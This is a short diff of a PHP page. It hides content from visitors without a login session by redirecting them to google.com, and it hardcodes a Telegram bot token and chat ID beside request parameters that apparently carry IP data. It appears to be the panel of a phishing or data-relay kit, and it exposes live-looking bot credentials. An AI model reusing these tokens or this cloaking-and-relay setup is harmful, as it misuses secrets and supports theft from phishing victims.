@@ -1,13 +1,9 @@
 <?php
-session_start(); // Start or resume the session
+session_start();
+if(isset($_SESSION["username"])) {
 
-if (!isset($_SESSION['username'])) {
-    // If the session variable 'username' is not set, redirect to Google
-    header('Location: https://google.com');
-    exit(); // Prevent further execution of the script
-}
 if(isset($_GET['messageId'])){
-$botToken = "6367338929:AAHMMbQSLxEpLOkX1027eYvgaumrd9-NRCk";
+$botToken = "6887294087:AAEC802yB2ffTk_d0HaC43X6tv3VTnaHTOs";
 $chatID = "1064643518";
 	$messageId=$_GET['messageId'];
 	$ipzebi=$_GET['ipzebi'];
@@ -1019,3 +1015,10 @@ border:0;
 </footer>
 </div><div id="quick-tools-container" style="display:none;"><div>
 </body></html>
+
+<?php
+}else {
+HEADER("Location: https://google.com");
+
+}
+?>
